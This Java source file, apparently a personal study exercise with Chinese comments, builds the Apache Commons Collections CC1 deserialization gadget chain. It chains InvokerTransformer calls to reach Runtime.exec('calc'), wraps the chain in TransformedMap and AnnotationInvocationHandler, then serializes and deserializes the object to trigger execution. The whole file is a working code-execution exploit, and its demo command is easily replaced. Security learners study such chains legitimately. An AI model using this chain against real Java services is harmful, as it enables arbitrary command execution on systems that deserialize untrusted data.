/*
 * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.
 * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.
 * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.
 * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.
 * Vestibulum commodo. Ut rhoncus gravida arcu.
 */

package com.y5neko.sec.deserialize;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.map.TransformedSortedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class TestCC1 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        //首先通过反射获取exec方法
        //Runtime runtime = Runtime.getRuntime();
        //InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        //invokerTransformer.transform(runtime);


        //Class rt = Class.forName("java.lang.Runtime");
        //Class rt = Runtime.class;
//        //普通反射
//        Method getRuntimeMethod = rt.getMethod("getRuntime",null);
//        Runtime runtime = (Runtime) getRuntimeMethod.invoke(null,null);
//        Method execMethod = rt.getMethod("exec", String.class);
//        execMethod.invoke(runtime,"calc");
        //用transform方法改写
        //获取getRuntime方法,首先获取Class原型类的getDeclaredMethod方法，然后定义传入参数类型，最后传入两个参数
//        Method getRuntime = (Method) new InvokerTransformer(
//                "getDeclaredMethod",
//                new Class[]{String.class,Class[].class},
//                new Object[]{"getRuntime",null}
//        ).transform(rt);
//        //获取Runtime对象,首先获取invoke方法，定义参数类型，最后两个null
//        Runtime runtime = (Runtime) new InvokerTransformer(
//                "invoke",
//                new Class[]{Object.class,Object[].class},
//                new Object[]{null,null}
//        ).transform(getRuntime);
//        //反射执行exec方法
//        new InvokerTransformer(
//                "exec",
//                new Class[]{String.class},
//                new Object[]{"calc"}
//        ).transform(runtime);
        //用ChainedTransformer改写
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(rt);


        //实例化一个HashMap对象用于decorate方法接收
        HashMap<Object,Object> map = new HashMap<>();
        //首先通过put方法推一个键值对进去，才能进行遍历
        map.put("value","test value");
        //调用public方法decorate实例化
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

//        //遍历Map的常用格式
//        for(Map.Entry<Object, Object> entry:transformedMap.entrySet()){
//            //通过setValue方法传入Runtime对象
//            entry.setValue(runtime);
//        }

        //反射获取AnnotationInvocationHandler类
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object object = constructor.newInstance(Target.class, transformedMap);

        serialize(object);
        unserialize("H:\\学习记录\\学习记录Markdown\\Java安全通用\\CC1");
    }

    public static void serialize(Object object) throws IOException {
        ObjectOutputStream oos=new ObjectOutputStream(Files.newOutputStream(Paths.get("H:\\学习记录\\学习记录Markdown\\Java安全通用\\CC1")));
        oos.writeObject(object);
    }

    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream(filename));
        Object test = objectInputStream.readObject();
        System.out.println(test);
    }
}
